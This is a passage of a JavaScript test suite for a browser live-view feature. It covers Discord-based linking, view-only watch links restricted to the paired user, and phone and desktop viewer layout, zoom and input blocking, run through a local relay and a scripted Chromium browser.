    quietMs: 20, pollSeconds: 1, retryMs: 200, watchLink: async () => ({ link: `https://w.trycloudflare.com/${"d".repeat(64)}/`, expiresAt: Date.now() + 3_600_000 }) });
  try {
    const r = await link.op({ op: "link", app: "discord", token: DC_TOKEN });
    assert.ok(await until(() => dc.identified.length > 0));
    dc.dispatch("MESSAGE_CREATE", dc.dm(DM, USER, r.handoff.discord.code));
    assert.ok(await until(() => link.read().discord.state === "linked"));
    assert.ok(await until(() => link.reading().discord), "still connected: /watch is on");
    dc.dispatch("MESSAGE_CREATE", dc.dm(DM, "499999999999999999", "/watch"));
    dc.dispatch("MESSAGE_CREATE", dc.dm(DM, USER, "/watch"));
    assert.ok(await until(() => dc.posts().some((p) => /Watch the browser live/.test(p.body.content))));
    const posts = dc.posts().filter((p) => /Watch the browser live/.test(p.body.content));
    assert.equal(posts.length, 1, "the pinned user only");
    assert.equal(posts[0].body.flags, 1 << 2, "no link preview");
    assert.match(posts[0].body.content, /https:\/\/w\.trycloudflare\.com\/d{64}\//);
  } finally { link.stop(); await dc.close(); }
});

// ---- the page in a phone's browser and a computer's (skips without PAIRBROWSE_TEST_RUNTIME) ----

const runtime = process.env.PAIRBROWSE_TEST_RUNTIME?.replace(/^~/, process.env.HOME);
const PIXEL = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";
// A watch link opened in the runtime's browser through a loopback relay to the guest port (the
// public tunnel's place), frames flowing, covered as guests get them.
async function watchPage(t, contextOpts) {
  const net = await import("node:net");
  const { patchright } = await import("./helpers/live.mjs");
  const tabs = fakeTabs(["https://shop.example/pay", "https://other.example/"]);
  const invites = createInvites();
  const view = await startLiveView({ getContext: async () => tabs.ctx, currentUrl: async () => tabs.pages[0].url(), invites, grants: createGrants({}), publicHost: () => PUB,
    covers: { want: () => {}, picture: async () => PIXEL } });
  view.setSession({ name: "default", where: "Local" });
  const frames = setInterval(() => tabs.sessions.at(-1)?.emit("Page.screencastFrame", { data: PIXEL, metadata: { deviceWidth: 1280, deviceHeight: 800 }, sessionId: 1 }), 150);
  const relay = net.createServer((a) => { const b = net.connect(view.guestPort, "127.0.0.1"); for (const [x, y] of [[a, b], [b, a]]) { x.on("error", () => {}); x.on("close", () => y.destroy()); x.pipe(y); } });
  await new Promise((r) => relay.listen(0, "127.0.0.1", r));
  const browser = await patchright(runtime).chromium.launch();
  // A person's browser by its name (a headless one is named as such, and a preview bot's name never gets the stream).
  const context = await browser.newContext({ userAgent: contextOpts.isMobile ? BROWSER_UA : "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15", ...contextOpts });
  const page = await context.newPage();
  const errors = [], posts = [];
  page.on("pageerror", (e) => errors.push(String(e)));
  page.on("request", (r) => { if (r.method() !== "GET") posts.push(r.url()); });
  t.after(async () => { clearInterval(frames); await browser.close().catch(() => {}); relay.close(); view.close(); });
  const w = invites.create({ share: "watch" });
  const url = `http://127.0.0.1:${relay.address().port}/${w.key}/`;
  return { ...tabs, view, invites, w, url, page, errors, posts };
}

test("on a phone: the watch viewer fits the screen, says it is view only, zooms on the phone, and nothing a finger or key does reaches the browser", { skip: !runtime, timeout: 60_000 }, async (t) => {
  const s = await watchPage(t, { viewport: { width: 390, height: 844 }, isMobile: true, hasTouch: true, deviceScaleFactor: 3 });
  await s.page.goto(s.url);
  await s.page.waitForSelector('#watch-conn[data-s="live"]');
  await s.page.waitForSelector("#screen:not([hidden])");
  assert.ok(await until(() => s.view.watching(s.w.id) === 1), "one page watching");
  assert.equal(await s.page.evaluate(() => document.documentElement.scrollWidth <= document.documentElement.clientWidth), true, "no horizontal scroll");
  assert.equal(await s.page.textContent(".watch-title"), "Watching liveView only");
  for (const sel of [".side", "#side-btn", "#newtab", "#url-input", "#back", "#share-btn", "#profile-btn"]) assert.equal(await s.page.isVisible(sel), false, `${sel} hidden`);
  for (const sel of ["#watchbar", "#stage", "#watch-zoom-in", "#watch-zoom-out", "#watch-zoom-level"]) {
    const b = await s.page.locator(sel).boundingBox();
    assert.ok(b && b.x >= 0 && b.x + b.width <= 390.5 && b.y >= 0 && b.y + b.height <= 844.5, `${sel} on screen`);
  }
  assert.ok((await s.page.locator("#watch-zoom-in").boundingBox()).height >= 44, "a finger's size");
  // The layout: the picture fills the width right under the address; one connection indicator; the
  // zoom keys in the bar, never over the picture; one tab, its title alone; activity lines cut with an ellipsis.
  const lay = await s.page.evaluate(() => {
    const r = (sel) => document.querySelector(sel).getBoundingClientRect();
    const shown = (sel) => [...document.querySelectorAll(sel)].filter((n) => n.checkVisibility()).length;
    const li = document.querySelector("#activity li");
    return { img: r("#screen").toJSON(), toolbar: r(".toolbar").toJSON(), keys: r("#watchkeys").toJSON(), stage: r("#stage").toJSON(),
      states: shown("#state, #watch-conn"), tabs: shown(".tab"), marks: shown(".tab .agent, .tab .claude"), ellipsis: li ? getComputedStyle(li).textOverflow : "ellipsis" };
  });
  assert.ok(Math.abs(lay.img.top - lay.toolbar.bottom) <= 2, `the picture starts under the address: ${lay.img.top} vs ${lay.toolbar.bottom}`);
  assert.ok(lay.img.width >= 388, `fit to the width: ${lay.img.width}`);
  assert.ok(lay.stage.bottom > 600, "the page area takes the screen's height");
  assert.ok(lay.keys.bottom <= lay.img.top, "the zoom keys never cover the picture");
  assert.equal(lay.states, 1, "one connection indicator");
  assert.equal(lay.tabs, 1, "one tab");
  assert.equal(lay.marks, 0, "no duplicated marks on it");
  assert.equal(lay.ellipsis, "ellipsis");
  // Zoom on the phone: +, a double tap, back to 1x.
  await s.page.tap("#watch-zoom-in");
  assert.equal(await s.page.textContent("#watch-zoom-level"), "1.5x");
  await s.page.tap("#watch-zoom-level");
  assert.equal(await s.page.textContent("#watch-zoom-level"), "1x");
  const box = await s.page.locator("#screen").boundingBox();
  const mid = { x: box.x + box.width / 2, y: box.y + box.height / 2 };
  await s.page.touchscreen.tap(mid.x, mid.y);
  await s.page.touchscreen.tap(mid.x, mid.y);
  assert.ok(await until(() => s.page.evaluate(() => document.getElementById("watch-zoom-level").textContent !== "1x")), "a double tap zooms in");
  // Taps, keys, the wheel: nothing goes anywhere.
  await s.page.touchscreen.tap(mid.x, mid.y + 20);
  await s.page.keyboard.type("hello");
  await s.page.keyboard.press("Enter");
  await s.page.mouse.wheel(0, 400);
  await wait(300);
  assert.deepEqual(s.posts, [], "no request but GETs");
  assert.equal(s.input().length, 0, "no input reached a tab");
  // Stopped: the page says so and opens nothing again.
  s.invites.revoke(s.w.id);
  await s.page.waitForFunction(() => document.getElementById("overlay-title").textContent === "This watch link ended");
  assert.equal(await s.page.textContent("#watch-conn"), "Ended");
  assert.deepEqual(s.errors, []);
});

test("on a computer: the watch viewer keeps the tabs and the workspace column, view only", { skip: !runtime, timeout: 60_000 }, async (t) => {
  const s = await watchPage(t, { viewport: { width: 1280, height: 800 } });
  await s.page.goto(s.url);
  await s.page.waitForSelector('#watch-conn[data-s="live"]');
  await s.page.waitForSelector("#screen:not([hidden])");
  assert.equal(await s.page.isVisible(".side"), true);
  assert.ok(await until(() => s.page.evaluate(() => document.querySelectorAll("#tabs .tab").length === 2)), "the tabs");
  await s.page.click("#screen");
  await s.page.keyboard.type("x");
  await wait(200);
  assert.deepEqual(s.posts, []);
  assert.equal(s.input().length, 0);
  assert.deepEqual(s.errors, []);
});
